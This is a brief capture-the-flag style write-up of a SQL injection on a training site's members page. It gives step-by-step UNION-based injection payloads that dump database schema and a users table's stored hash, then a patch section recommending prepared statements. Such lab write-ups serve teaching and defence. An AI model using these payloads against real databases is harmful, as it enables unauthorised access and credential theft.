## Vulnerabilities Description :  

- SQL injection : inject malicious SQL code as user input to manipulate or get database informations. 


## Exploit

-> go to members page 
-> submit 7 OR 1=1 (we get the list of members so injection is possible)
-> submit 7 OR 1=1 UNION SELECT 1,2 (we get a list of users so the number of colum to use for UNION query is 2, otherwise we will get a error message)
-> submit 7 OR UNION SELECT table_name, column_name FROM information_schema.columns (we get DB informations)
-> submit 7 OR UNION SELECT commentaire, countersign FROM information_schema.columns (there is some usefull informations here)

	ID: 7 OR 1=1 UNION SELECT commentaire, countersign FROM users 
	First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
	Surname : 5ff9d0165b4f92b14994e5c685cdce28

-> decrypt it to get the flag

## Patch

-> sanitize and validate user input.  
-> never concat user input into SQL queries.  
-> Use SQL prepared statements so that user input is treated strictly as data, not as part of the SQL query.  